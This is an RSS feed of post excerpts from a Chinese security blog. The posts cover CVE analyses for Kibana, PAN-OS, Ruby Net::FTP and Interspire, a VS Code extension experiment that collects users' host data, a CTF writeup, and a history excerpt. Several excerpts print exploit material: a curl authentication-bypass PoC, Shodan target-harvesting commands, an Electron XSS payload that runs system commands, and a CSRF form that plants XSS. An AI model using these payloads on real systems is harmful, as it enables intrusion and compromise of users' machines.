<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on # alert`D0n9` ｜ 输攻墨守</title>
    <link>http://d0n9.github.io/posts/</link>
    <description>Recent content in Posts on # alert`D0n9` ｜ 输攻墨守</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-CN</language>
    <lastBuildDate>Tue, 05 Oct 2021 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://d0n9.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>📌 [招聘]-安全工程师 (基础建设&amp;攻防方向)</title>
      <link>http://d0n9.github.io/posts/79d11423-9314-4c85-b9c0-382f0bfb6c8b/</link>
      <pubDate>Tue, 05 Oct 2021 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/79d11423-9314-4c85-b9c0-382f0bfb6c8b/</guid>
      <description>Keep安全招聘，📮 简历投递 wyd0n9[at]gmail[dot]com
安全工程师（基础建设/攻防方向） 职位描述 负责安全规范制定、安全评估、安全方案设计、代码审计、安全测试、漏洞应急响应等工作。具体工作方向包括Web应用安全、客户端安全、主机系统安全、网络安全、攻击检测与防御、红蓝演练等 负责企业内安全设备的运维，包括安全策略管理、系统维护、优化以及安全事件响应 参与公司基础网络安全架构的建设，根据业务需求制定安全解决方案 负责SDL安全开发生命周期建设，提升公司应用安全建设能力 解决日常安全问题，在出现网络攻击或安全事件时进行紧急响应、恢复系统及调查取证 参与安全项目实施和管理 负责安全攻防新技术研究和业界趋势跟进 岗位要求 5年以上安全体系建立、安全攻防渗透等相关工作，本科以上，计算机相关专业。 熟悉Web安全，了解SQL注入，命令注入，反序列化等漏洞原理和利用方式，能对Java项目进行白盒代码审计，有独立挖掘过或分析过CVE经验者优先 在Web应用安全、移动APP安全、主机系统安全、网络安全、攻击检测与防御至少一方面有较深入的研究和实践 熟悉web应用与业务的漏洞挖掘，渗透测试，代码审计及安全解决方案 有良好的计算机相关技术基础知识，对网络、操作系统有较深的了解 为人正直，具备良好的问题分析与解决能力，有责任心，具有良好的沟通、协调组织能力； </description>
    </item>
    <item>
      <title>kibana console api LFI (CVE-2018-17246)</title>
      <link>http://d0n9.github.io/posts/f0d085ab-f3ec-4ce9-894a-41a4d2202ae2/</link>
      <pubDate>Fri, 21 Dec 2018 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/f0d085ab-f3ec-4ce9-894a-41a4d2202ae2/</guid>
      <description>背景 该漏洞由 CyberArk Labs 实验室 Nethanel Coppenhagen 发现 （https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/），原文介绍该漏洞可能会导致远程代码执行，这是相当严重的问题，因为我们知道可以执行代码往往意味着也可以执行操作系统命令，既远程命令执行，不过深入了解后发现如果要达到远程命令执行其实十分困难，对目标环境有较为苛刻的要求。【且听我娓娓道来】
影响范围 kibana version &amp;lt; 6.4.3 kibana version &amp;lt; 5.6.13
可能是因为kibana大版本升级会有兼容性问题，企业内kibana几乎都是集群搭的，所以kibana 很贴心对于 5.x 版本也提供了修复补丁，很赞
漏洞成因 对于漏洞成因网上已经有分析或者翻译文章，这里只简单说一下
如下图， require 函数接收一个变量 name ，和 ./ 进行拼接，并且没有任何检查，require() 函数支持使用 ../ 的方式完成跳目录 （ http://nodejs.cn/api/modules.html#modules_require ）所以LFI利用便呼之欲出。
然后如下图，在api类里 line:60 ~ 66 是 asJson 函数
然后如下图，line: 22 AND 42，实例导出api类，提供了可控的漏洞触发点
漏洞复现 搭环境，docker 一把梭
docker pull sebp/elk:642 存在漏洞的url，参数是 apis ，用 ../ 实现跳目录读取，因为读到 /etc/passwd ，nodejs 会抛出异常（因为不是正常的js文件嘛）不过还是证明是存在漏洞的，但是无法将读到的文件回显出来
如果有办法向kibana 服务器上传一个 js 文件，使 nodejs 读取执行，就可以rce了，但是很遗憾，nodejs 并不像 php 那样灵活，nodejs 对于 require() 的文件内容有格式要求，所以像php那些类似 lfi 姿势都无法使用。</description>
    </item>
    <item>
      <title>ImageMagick 漏洞凑热闹手札</title>
      <link>http://d0n9.github.io/posts/151a91bd-622f-4041-bf82-419d72cbab52/</link>
      <pubDate>Wed, 22 Aug 2018 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/151a91bd-622f-4041-bf82-419d72cbab52/</guid>
      <description>今天日常刷 twitter 看到 Tavis 点赞了这条推
经历过2016年魔图漏洞洗礼的人看到 ImageMagick 就很敏感，fu*k 这是又报漏洞了，ImageMagick 运用很广泛，赶紧应急一波。
不过比较坑的是就没有其他信息，受影响的主机受影响版本啥都没有，甚至组件官方也没有发布安全公告
按照建议的临时解决方案（https://www.kb.cert.org/vuls/id/332928 ）针对装有ImageMagick的机器改一下 /etc/ImageMagick/policy.xml 配置文件，禁用以下编码器。
&amp;lt;policy domain=&amp;#34;coder&amp;#34; rights=&amp;#34;none&amp;#34; pattern=&amp;#34;PS&amp;#34; /&amp;gt; &amp;lt;policy domain=&amp;#34;coder&amp;#34; rights=&amp;#34;none&amp;#34; pattern=&amp;#34;EPS&amp;#34; /&amp;gt; &amp;lt;policy domain=&amp;#34;coder&amp;#34; rights=&amp;#34;none&amp;#34; pattern=&amp;#34;PDF&amp;#34; /&amp;gt; &amp;lt;policy domain=&amp;#34;coder&amp;#34; rights=&amp;#34;none&amp;#34; pattern=&amp;#34;XPS&amp;#34; /&amp;gt; 其实在2016年的爆ImageMagick RCE（CVE-2016-3714）的时候，当时官方的解决方案就是修改配置文件的方式（https://imagetragick.com/ ）p.s 虽然使用黑名单的方式不太符合漏洞修复原则..
更改完配置文件后要怎样验证是否修复了呢？
两种方法
1、 找到各个网站的上传接口，把 poc 图片打一遍.. 反正是执行命令嘛，用 dnslog 或者反弹 SHELL 的 方式都可以 2、 在主机上执行 convert poc.jpeg poc.gif
但是这两种方式都不是最优
因为短时间不可能找全所有的上传接口，而且打 poc 的方式存在一定的不稳定性，在不确定是否会对主机造成影响的情况下尽量不要尝试，当然如果是测试环境的话那就随便造了。
执行convert 方式最简单的，排查起来也会更快速更准确，对主机影响也最小最可控，不过呢，有些主机安装的 ImageMagick-libs 可能不会有 convert 命令 （不确定）
然后在我习惯性 less poc.jpeg （less 命令很好用）发现竟然也执行了。</description>
    </item>
    <item>
      <title>[摘文]·徐阶觉醒 知行合一</title>
      <link>http://d0n9.github.io/posts/7b245f8a-a7af-4b41-9d35-afa137303fa7/</link>
      <pubDate>Sat, 30 Jun 2018 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/7b245f8a-a7af-4b41-9d35-afa137303fa7/</guid>
      <description>摘自 《明朝那些事儿》第七章 徐阶的觉醒 事情是这样的，延平一带虽然穷，却还有个天然优势——产矿。
这矿出产的东西也比较特别——银。
当年那个时候，银矿的地位大致相当于今天的印钞厂，只要能挖出来，就能用出去，还不用担心通货膨胀问题。
延平是个民风骠悍的地方，所谓民风骠悍，通俗点讲就是不读书、敢闹事，靠山吃山，靠水吃水，不吃白不吃。
于是各地未经生产安全部门批准的小银窑纷纷开张，四处刨坑挖洞，还勾结地方黑社会，称霸一方，鱼肉百姓。
刚刚断完冤案的徐阶意气风发，他准备再显身手，彻底解决这帮为害百姓的人渣。但让他意想不到的事情发生了，虽然三令五申，反复清查，情况却丝毫没有好转。官员们依然喝茶聊天，恶霸们依然盗挖银两。
徐阶并不是个天真的人，他十分清楚，官员们之所以采取这样的态度，是因为在那些被盗掘的银子中，必定有属于他们的一份。
官匪勾结，蛇鼠一窝，没有人肯执行他的命令。这一次，徐阶真的无计可施了，文件可以自己看，案件也可以自己审，但是要他手提钢刀、深入虎穴剿匪，这玩笑就开得太大了。
最初，在徐阶看来，这只是一件他必须解决的治安案件，但他没有想到，对这件事情的处理将成为他一生的转折点。
时间一天天过去，事情却毫无进展，在逐日的等待中，徐阶开始疑惑了。
即使在被张璁恶整，皇帝训斥的时候，徐阶也从未畏惧过，因为他一直认为自己的所作所为是对的，是站得住脚的，但是现在他似乎有点心虚了。
二十多年以来，虽然饱经风雨，但徐阶始终是一个十分自信的人，他相信自己学到的四书五经，相信自己听到的圣贤之言，那些历史上的名臣名相和他们的不朽功绩一直都是他学习的榜样。徐阶曾经坚定地认为，只要信守圣人的教诲，遵循礼仪廉耻，必可修身齐家，治国平天下。
可是现在出问题了，徐阶惊奇地发现，雷厉风行、刚正不阿，在现实中失去了作用，至少在现在这件事情上，一点作用也没有。
而他的属下们并没有相同的道德觉悟，也不打算培养类似的品德，他们并不理会徐阶的苦心，只是站在一旁冷眼旁观，等待着徐阶的离去，然后继续获取他们的利益。
徐阶想不通，他忿忿不平了，他出离愤怒了，这个世界怎么会是这个样子！
它不是书中所记载的那个太平盛世，更不是人心向善的桃花源，这是一个丑陋的世界，所有的人最为关心的，只是自己的利益得失。
所谓舍身取义，所谓心怀天下，在他那些贪婪的下属心中，统统归结为两个字——放屁。
绝望的情绪弥漫在徐阶的心中，他突然发现，自己二十多年所信奉的圣人之道、处事原则原来竟然毫无用处，连福建延平府的几个奸吏恶霸都解决不了，治理天下、青史留名真是笑话！
徐阶终于遇到了他人生中的最大危机——信仰的危机，多年所学已然无用，世上还有什么东西可以相信可以坚持！
然而他最终没有放弃，因为他还有第二个选择——良知之学，知行合一。
我的一位哲学系毕业的好朋友曾经这样对我说：大学里不应该开设哲学本科专业，因为学生不懂。
这是一句至理名言，作为这个世界上最为高深的智慧，哲学是无数天才一生思考、生活的结晶，他们吃过许多亏，受过许多苦，才最终将其浓缩为书本上的短短数言。
一个二十岁的青年人是不会懂得这些的，他们太天真，太幼稚，他们或许能够在考试中得到一百分，却不可能真正了解其中的含义。
所以他们虽然手握真理，却无法使用，满怀热情地踏入社会，却被撞得头破血流。
徐阶大致就是这样一个人，他也不懂，虽然他了解心学的所有内容，却并不知道该怎样去做。至于六年前聂豹告诉他的那四个字，则更是不得要领。
什么是知行合一答：就是知与行的合一。评：废话。
徐阶反复思考着这四个字，却始终摸不着头脑，聂豹说话时那郑重肃穆的表情依然浮现在他的眼前，他肯定这位先生不是在拿他开涮。
但问题是他怎么都看不出这四个字有什么作用，难道像念咒一样把它念出来，矿霸们就能落荒而逃，官员们就会老实办事所谓良知之学，所谓光明之学，在这个现实的世界中，又有何用处
于茫茫黑暗之中，光明何处去寻！
百思不得其解的徐阶沉默了，在官员们的冷眼旁观和冷嘲热讽中，他开始了漫长的思考。
在痛苦的思索中，他终于发现，自己可能犯了一个根本的错误，他坚守二十余年的信念和原则是存在很大问题的。这套传统道德体系或许是对的，却并无用处。真正决定大多数人行为的，是另一样东西。
只要找到这样东西，就能解决所有的难题。于是徐阶决定，否定自己所有的过往，把一切推倒重来，去找到那样东西。
说教没有用，礼仪廉耻没有用，忠孝节义也没有用，这玩意除了让人昏昏欲睡外，并没有任何作用。
在剥除这个丑恶世界的所有伪装之后，徐阶终于找到了最后的答案——利益。
胸怀天下、舍生取义的绝对道德确实是存在的，可惜的是这玩意太高级，付出的代价太高，从古自今，除了个别先进分子外，大多数人都不愿消费。
利益，只有充足的利益，才有驱动人们的魔力，这就是这个世界的真实面目，极其的残酷，却异常的真实。
在这个残酷的现实面前，徐阶终于明白了知行合一的真意，无论有多么伟大正直的理想，要实现它，还必须懂得两个字——变通。只有变通，只有切合实际的行动，才能适应这个变化万千的世界。
于是在醒悟的那一天，徐阶丢弃了他曾信奉几十年的文字和理念，面对那些肆无忌惮的矿霸贪官，作出了一个前所未有的决定。
不久之后，徐阶的随从们惊奇地发现，几乎在一夜之间，那些霸占银矿的地方黑社会突然退隐江湖，老老实实地回了家。
在纳闷和兴奋的情绪交织中，他们向徐阶通报了这个好消息，然而出乎他们意料的是，徐阶并没有丝毫的惊讶和喜悦，似乎这早在他预料之中。
而事实确实如此。
几天前，徐阶带领着几个亲信，来到了银矿的所在地，他没有去那里的官衙，而是找到了另一群人——当地的里长。
当然，这些所谓的里长并不是什么善类，盗矿的好处自然也有他们的一份，就在他们不知这位大人来意、惶恐不安的时候，徐阶亮出了底牌：铲除那些矿霸，我将给你们更大的利益。
于是一切都解决了，这些以往雷打不动的人突然焕发了生机，他们立刻动员起来，发动各村各户，连夜把参与盗矿的人抓了起来，刻不容缓。
在徐阶的政策影响下，各地各村纷纷效仿，兴起了打击矿盗的高潮，对这种特殊的群众运动，当地官员个个目瞪口呆，束手无策。矿盗干不下去，只好走人，危害当地十余年的祸患就此解除。
徐阶终于成功了，他没有死守所谓的绝对道德，用利益打倒了利益。但当他将所有内情坦诚相告的时候，一位随从却十分不以为然，愤然而起，指责徐阶的处理方式是耍滑头，搞妥协。
“是的，这是妥协，”徐阶平静地回答道，“但我赢了。”
经历了艰辛的历练，徐阶终于知道了这个世界的生存法则，也彻底领悟了心学的含义和聂豹留给他的那个秘诀。
“知行合一，我想我已经明白了。”徐阶注视着当年他来时的方向，作出了这个自信的回答。</description>
    </item>
    <item>
      <title>CVE-2017-14322 登录认证绕过分析</title>
      <link>http://d0n9.github.io/posts/c3270e50-c3d4-4773-b4e1-40d94f134235/</link>
      <pubDate>Sat, 05 May 2018 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/c3270e50-c3d4-4773-b4e1-40d94f134235/</guid>
      <description>首先这并不是一篇翻译文章，是看了原文之后我对这个漏洞的一点分析和理解。
https://security.infoteam.ch/en/blog/posts/narrative-of-an-incident-response-from-compromise-to-the-publication-of-the-weakness.html
Interspire Email Marketer 是一款商业软件，在6.1.0之后的版本由于错误使用逻辑运算符和忽视弱类型特点产生了安全问题，并在6.1.6做了修复，但中间竟然相隔了5年之久，最坑的是好像更新版本还需要支付额外的费用～
作者是在对客户进行应急响应时发现了这个0day，其应急过程和思路很值得学习和思考。
先是客户发现某个账户发邮件异常，作者通过排查Web日志定位问题，注意到蓝色框是referer字段，表示这条访问记录是从Google过来的，非常像是 Google Hacking 手法，这个IP使用GET访问了管理后台页面大小是5197，紧接着又一个GET访问这时响应变成了302并且页面大小变成了33478，这表明已经登录成功进入后台了，非常奇怪，因为并没有通过表单验证帐密，仅使用两个GET是不足以完成正常的登录认证流程。
这时应急就要考虑可能是身份凭证泄漏或者认证绕过等漏洞，因为种种迹象表明肯定和cookie有关系，但是使用Google Hacking这种撒网式攻击并不符合XSS之类的攻击流程，虽然我也去看了一下cookie也没有加HttpOnly。
既然判断前者可能性较低那就着重排查一下是不是有认证绕过之类的漏洞吧
作者也是很有经验，首先就去看了处理cookie认证那部分代码，有幸我在网上找到了6.1.2版本的源代码，可以一窥究竟。
在./admin/com/init.php:484~509行，这是出现漏洞的代码，有两个问题
1、使用 == 进行判断，会受PHP弱类型特性影响，进行强转 2、整套源码中多处使用 ! 写法，猜测这里开发者可能错误理解了 ! 的作用，原意可能是对比 $tempUser-&amp;gt;settings[&amp;lsquo;LoginCheck&amp;rsquo;] == $tempCookie[&amp;lsquo;rand&amp;rsquo;] ，如果相等则为真，然后用 ! 取反，这样就不会进入到这个 if 判断里，但是用法错误，因为 ! 的优先级比 == 要高 $tempCookie = IEM::requestGetCookie(&amp;#39;IEM_CookieLogin&amp;#39;, array()); ··· 略 ··· $tempUser = new User_API(); $tempUser-&amp;gt;Load(intval($tempCookie[&amp;#39;user&amp;#39;])); ··· 略 ··· if (!$tempUser-&amp;gt;settings[&amp;#39;LoginCheck&amp;#39;] == $tempCookie[&amp;#39;rand&amp;#39;]) { break; } 下面这个测试就是很好的证明
首先 &amp;lsquo;1&amp;rsquo; === 1，必然是False，因为类型不同 然后 !&amp;lsquo;1&amp;rsquo;===1，结果也是False，可见并不是先进行&#39;1&amp;rsquo;===1的判断再取反
先看一下 $tempCookie 来源是 IEM::requestGetCookie(&amp;lsquo;IEM_CookieLogin&amp;rsquo;, array())</description>
    </item>
    <item>
      <title>CVE-2017-15944 Palo Alto防火墙远程代码执行构造 EXP</title>
      <link>http://d0n9.github.io/posts/09538882-9eac-471e-a22e-002c9d627a18/</link>
      <pubDate>Fri, 26 Jan 2018 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/09538882-9eac-471e-a22e-002c9d627a18/</guid>
      <description>在 exploit-db 看到 CVE-2017-15944 这个漏洞，三处漏洞打出的组合拳导致最后命令执行，三环缺一不可，最喜欢这样变废为宝的利用，但是在复现构造EXP还是遇到不少“坑”，本文记录一下填坑的过程&amp;hellip;.
exploit-db 地址 https://www.exploit-db.com/exploits/43342/
该漏洞影响范围还是很广泛的，但是并没有看到有人放出EXP，最多只是PoC或者省去了很坑的命令执行漏洞。
&amp;lt;=PAN-OS 6.1.18 &amp;lt;=PAN-OS 7.0.18 &amp;lt;=PAN-OS 7.1.13 &amp;lt;=PAN-OS 8.0.5 三处漏洞分别为：权限绕过，任意目录创建，命令执行
不过命令执行部分的详细内容原作者并没有给出，只有 Payload ，而且还执行不成功，手头也没有设备，只好硬着头皮去 Shodan 找到环境，一点点摸索尝试构造 EXP
$ shodan download search &amp;#39;Location: /php/login.php port:&amp;#34;4443&amp;#34;&amp;#39; limit 3000 $ shodan parse --fields ip_str search.json.gz 原作者给出了权限绕过的 PoC
imac:~/pa% curl -H &amp;#34;Cookie: PHPSESSID=hacked;&amp;#34; 10.0.0.1/php/utils/debug.php &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Moved Temporarily&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;Moved Temporarily&amp;lt;/h1&amp;gt; &amp;lt;p&amp;gt;The document has moved &amp;lt;a href=&amp;#34;http://10.0.0.1:28250/php/logout.php &amp;#34;&amp;gt;here&amp;lt;/a&amp;gt;.&amp;lt;/p&amp;gt; &amp;lt;address&amp;gt;PanWeb Server/ - at 127.0.0.1:28250 Port 80&amp;lt;/address&amp;gt;&amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; imac:~/pa% curl -H &amp;#34;Cookie: PHPSESSID=hacked;&amp;#34; &amp;#39; 10.</description>
    </item>
    <item>
      <title>vscode extension 钓鱼</title>
      <link>http://d0n9.github.io/posts/d5b71c9b-aa49-460c-8b7e-9aa350df0c89/</link>
      <pubDate>Wed, 17 Jan 2018 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/d5b71c9b-aa49-460c-8b7e-9aa350df0c89/</guid>
      <description>灵感来源于fate0这篇 Package 钓鱼
随想做一次针对开发者的“钓鱼”实验，编程语言模块库的钓鱼实验fate0和ztz已经做过了，所以这次把实验对象选择编辑器(IDE)
$5买了一台廉价vps用作收集用户数据，收集以下信息。
· hostname · whoami · date · uname · ip
mysql&amp;gt; desc db; +----------+-----------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +----------+-----------------+------+-----+---------+----------------+ | id | int(4) unsigned | NO | PRI | NULL | auto_increment | | hostname | varchar(32) | NO | | NULL | | | whoami | varchar(32) | NO | | NULL | | | date | varchar(32) | NO | | NULL | | | uname | varchar(32) | NO | | NULL | | | ide | varchar(32) | NO | | NULL | | | ip | varchar(32) | NO | | NULL | | +----------+-----------------+------+-----+---------+----------------+ 获取ip方式使用$_SERVER[&amp;ldquo;REMOTE_ADDR&amp;rdquo;]; 所以可能会不准确。</description>
    </item>
    <item>
      <title>CVE-2017-17405 Ruby Command injection</title>
      <link>http://d0n9.github.io/posts/d90669d3-a497-40cd-b73a-7e02bcc49cf5/</link>
      <pubDate>Sat, 16 Dec 2017 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/d90669d3-a497-40cd-b73a-7e02bcc49cf5/</guid>
      <description>Ruby 是一种面向对象、命令式、函数式、动态的通用编程语言。在20世纪90年代中期由日本计算机科学家松本行弘（Matz）设计并开发。 - Ruby - 维基百科，自由的百科全书
编程语言里出现rce漏洞真的太少见了，CVE-2017-17405 是Ruby中Net::FTP 使用open() 并且localfile可控所导致的rce
Ruby 在 GitHub 中到项目在14号提交了fix Fix a command injection vulnerability in Net::FTP. · ruby/ruby@6d3f72e，可以看到几处原本使用open()现在改为了File.open()，之前没有接触过Ruby，奇怪为什么open()竟有执行命令的能力？
怀着这种问题打算找Ruby文档看看open()到底是什么鬼？然后我找到了这个 Module: Kernel (Ruby 2.3.0) 详细介绍了CVE-2017-17405的成因，其实很简单，open()可以作为打开文件使用，但是，敲黑板! 在文件名可控到时候则不安全，因为如果文件名以&amp;rsquo;|&amp;lsquo;开头时，其后的字符串会被当作命令来执行，而且文件名为&amp;quot;|-&amp;ldquo;的话，open将生成Ruby的子进程，并返回与子进程之间的管道(pipe)(IO对象)。(此时的运作与IO.popen相同。）
简直可怕，这个&amp;quot;特性&amp;quot;简直是Python程序员写Ruby时最最需要注意的地方之一呀。（perl也有这样的“特性”）
本地试试&amp;quot;威力&amp;rdquo;
可能有人会说，&amp;ldquo;这也是正常功能呀，官方文档也有提及，自己不仔细看文档怪谁&amp;rdquo;
的确，编程语言可以说时开发者不仔细看文档，开发者说文档内容太多大部分程序员都是当作字典用到到时候查一查，那总得有人为漏洞买单吧。
lib/net/ftp.rb，官方也是使用了错误了函数，可见官方开发者也没有仔细看文档呀，233
ref: https://www.ruby-lang.org/en/news/2017/12/14/net-ftp-command-injection-cve-2017-17405/ http://ruby-doc.org/core-2.3.0/Kernel.html#method-i-open</description>
    </item>
    <item>
      <title>幕布(mubu.com) Client 远程命令执行</title>
      <link>http://d0n9.github.io/posts/e0642d46-a4f6-48b3-99ed-dc72372d0873/</link>
      <pubDate>Sat, 16 Dec 2017 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/e0642d46-a4f6-48b3-99ed-dc72372d0873/</guid>
      <description>uodate
一位安全研究员对幕布客户端的最新研究
https://xz.aliyun.com/t/4910
幕布(mubu.com)是一款头脑管理工具，用更高效的方式和清晰的结构来记录笔记、管理任务、制定工作计划、头脑风暴。用最好的方式释放您的大脑！
幕布使用 Electron 框架开发，想要验证这一点很容易，在 /Applications/幕布.app/Contents/ 可以可以发现一些 Electron 框架的信息
Electron 基于 Chromium 和 Node.js, 使用 HTML, CSS 和 JavaScript 来快速开发桌面程序。近几年发展迅猛，很多我们熟知的app其实都是Electron开发的，比如 vscode、atom、GitHub Desktop 等
在Black Hat Briefings 2017上国外安全研究员Luca Carettoni发表了一篇议题 ELECTRONEGATIVITY - A STUDY OF ELECTRON SECURITY
简单来说就是可以利用JavaScript执行系统命令，进而XSS跨站脚本攻击变成RCE远程命令执行
所以先要找到一个XSS漏洞，macOS上幕布1.1.0 版本有很多地方存在XSS，比如在搜索框输入JavaScript代码可正常执行 试试弹计算器的Payload
&amp;lt;script type=&amp;#34;text/javascript&amp;#34;&amp;gt; window.top.require(&amp;#39;child_process&amp;#39;).execFile(&amp;#39;/Applications/Calculator.app/Contents/MacOS/Calculator&amp;#39;,function(){});&amp;lt;/script&amp;gt; 但是搜索框这个位置也只能影响到自己而已，还需要找到能够攻击别人XSS漏洞才够完美。 找呀找，发现文件夹名也能XSS，但也没办法攻击到别人，除非找到CSRF 创建文件夹或者越权更改文件夹名字的漏洞才行。 在Web版发现创建文件夹的CSRF漏洞
&amp;lt;html&amp;gt; &amp;lt;!-- CSRF PoC - generated by Burp Suite Professional --&amp;gt; &amp;lt;body&amp;gt; &amp;lt;script&amp;gt;history.pushState(&amp;#39;&amp;#39;, &amp;#39;&amp;#39;, &amp;#39;/&amp;#39;)&amp;lt;/script&amp;gt; &amp;lt;form action=&amp;#34;https://mubu.com/api/list/create_folder&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;folderId&amp;#34; value=&amp;#34;0&amp;#34; /&amp;gt; &amp;lt;input type=&amp;#34;hidden&amp;#34; name=&amp;#34;name&amp;#34; value=&amp;#34;&amp;lt;img/src=x onerror=s=document.</description>
    </item>
    <item>
      <title>命令注入一些利用技巧</title>
      <link>http://d0n9.github.io/posts/f886a750-a9d6-4f4b-917c-3110380276c7/</link>
      <pubDate>Wed, 05 Jul 2017 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/f886a750-a9d6-4f4b-917c-3110380276c7/</guid>
      <description>前言 如果在做渗透的时候如果能发现一处命令注入，肯定会特别开心，这个时候就离进内网不远了，但往往会遇到各种限制，本文记录一些利用技巧。
首先要先区分命令注入和代码执行的区别，这是两种不同的概念，很容易搞混。
可以看这篇文章 命令注入与代码执行的判断
命令注入我遇到绝大部分环境都是 Linux，Win 也有但是很少很少（可能是还是做渗透少）所以本文着重分享 Linux 下的一些姿势
判断 命令注入大致可分为有回显和没回显两种，检测判断方法可以参照@RickGray 所写的 漏洞检测的那些事儿 或者用 sleep 判断响应时间，有点像 SQL injection 时间盲注。
发现 根据判断方式一般准确度很高，可能存在漏洞的位置可能也是千奇百怪，如吴师傅曾发现过在发短信位置的命令注入，猜测这个位置有调用 sh ，或者无脑 fuzz，在可控的位置都打上 Payload 往往也会有奇效，运气成分很大。
如果是拼接，比如
&amp;lt;?php $vul = $_GET[&amp;#39;vul&amp;#39;]; echo(&amp;#34;grep {$vul} /etc/hosts -C 10&amp;#34;); echo &amp;#39;&amp;lt;br/&amp;gt;&amp;#39;; system(&amp;#34;grep {$vul} /etc/hosts -C 10&amp;#34;); 这里直接拼接进入 system 函数，存在命令注入，但由于前面有 grep命令，直接提交想执行的命令是行不通的，这时要利用一些方法 比如管道符 ** | **， 或者换行 ** %0a ** 利用 有回显自然方便，可以直接当做一个 &amp;ldquo;Shell接口&amp;rdquo;，不过容易遇到编码的坑也没有 tty 那样方便，这个时候就要考虑反弹 Shell 出来，反弹 Shell 是让目标主机主动连接你，所以需要有一个外网 IP 才行，常用的一条反弹命令，更多 文· Reverse Shell Cheat Sheet</description>
    </item>
    <item>
      <title>我加入的那些小秘圈</title>
      <link>http://d0n9.github.io/posts/348f15ab-236e-45b4-ad91-e367c5e14354/</link>
      <pubDate>Wed, 05 Jul 2017 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/348f15ab-236e-45b4-ad91-e367c5e14354/</guid>
      <description>代码审计 phith0n 的圈子，内容质量很高，p 牛还会不定期分享一些奇技淫巧，强烈推荐
腾讯安全平台部 CTFWP@Nu1L JAVA安全研究 qz安全情报分析 （好长时间不更新了）
茄子牛（RAY）建立的，茄牛内容更新很快，而且经常凌晨更新，一手安全情报资源，还会不定期分享一些红/蓝对抗的资料和知识，讨论的人也很多，绝对比关注一些安全媒体靠谱得多。
安全技术 （好长时间不更新了）
猪猪侠建立的，内容领域比较杂，好像是乌云普通白帽子会免费邀请，推荐安全爱好者和从业者多多关注。
CTF-Web🐶 （被限制了）
唯一的付费加入的圈子，主要是分享一些 CTF 相关内容，不过内容更新不太频繁</description>
    </item>
    <item>
      <title>mCTF2017 writeup</title>
      <link>http://d0n9.github.io/posts/c8000cc7-1135-4d5f-80c1-3e5236ba57e5/</link>
      <pubDate>Sat, 25 Mar 2017 00:00:00 +0000</pubDate>
      <guid>http://d0n9.github.io/posts/c8000cc7-1135-4d5f-80c1-3e5236ba57e5/</guid>
      <description>mCTF2017 writeup 选手 writeup
@__画船听雨 https://pan.baidu.com/s/1sljPuzV @王松_Striker http://pan.baidu.com/s/1miOBarA 密码: gpga @pcat http://pan.baidu.com/s/1i4S4CNb 密码：gb1f
大致是Web+Misc的出题方向思路，看了一些大佬发给的writeup，没有和预期的做题思路有太大偏差，其实题目也没涉及什么奇技淫巧，仔细看官方文档都能解决。
在微信公众里回复CTF关键字，拿到题目信息
提示很明显，这个邮箱会告诉你更多，向邮箱发任意消息会得到一个自动回复，内容是百度云盘里的一个zip包。
这里有个小问题，可能不会对某些邮箱或者进入垃圾箱的邮件自动回复，好在刚开始就发现了这个问题，后面改了公众号回复，把下载百度云盘直接贴出来了。
拿到zip，解压出来有一个被发现了.cap，很基础的流量审计题目，主要目的是从中拿到1.zip
然后其实zip是修改hex后的伪加密，这一步有多种解法，最简单直接cat，解开后里面的txt就是线上做题地址了。
拿到线上做题地址，打开看到是登录页面，后面分析access.log，这个页面很多sqlmap请求，看来有一部分人还是会想到注入，其实如果经常关注p牛博客的话，可能会对这句话有印象
哈哈，有理有据，这次也不例外，也是需要拿到登录页面的源码，常规的源码泄露思路也就是那些吧，备份习惯和编辑器问题啥的。
这时候就会有人开脚本扫了，但应该不会有什么收获，还可能被Ban IP，其实也并没有开Waf，貌似是阿里云给当成了ddos攻击
然后越来越多人在扫文件，怕这时候有人乱搞，考虑放出第一次hint
关键字：vim、文件备份，官方文档
接下来就很容易了吧，去翻一翻vim文档， Vim: vim_faq.txt Soga，还有un~这种的，vim就是叼，vim就是强。构造这样的链接
http://60.205.183.92/mCTF2017/.login.php.un.~
后面在审计access.log的时候看到在放hint之前就有人fuzz到了这个文件名称，但是前面少了点，失之交臂，一般像这种备份文件都是会隐藏了的，Linux下隐藏文件就是在文件名前面加点。
拿到源码后看登录逻辑，addslashes和md5()后带入sql查询，首先排除掉有注入，然后一开始有个判断password不能是空，不然就die，然后在setcookie前有个判断。
&amp;lt;?php include &amp;#39;../img/config-db.php&amp;#39;; header(&amp;#34;Content-Security-Policy: default-src &amp;#39;none&amp;#39;; script-src &amp;#39;none&amp;#39; &amp;#39;unsafe-inline&amp;#39;; style-src &amp;#39;self&amp;#39;; img-src &amp;#39;self&amp;#39;&amp;#34;); if(!isset($_POST[submit])){ pass; }else if(md5($_REQUEST[password]) == &amp;#39;&amp;#39;){ die(&amp;#39;error&amp;#39;); }else{ $user = addslashes($_POST[username]); $passwd = md5($_POST[password]); $sql = &amp;#34;select `passwd` from users where user=&amp;#39;{$user}&amp;#39;&amp;#34;; $result = mysql_query($sql); $row = mysql_fetch_row($result); if($row[0] === $passwd){ 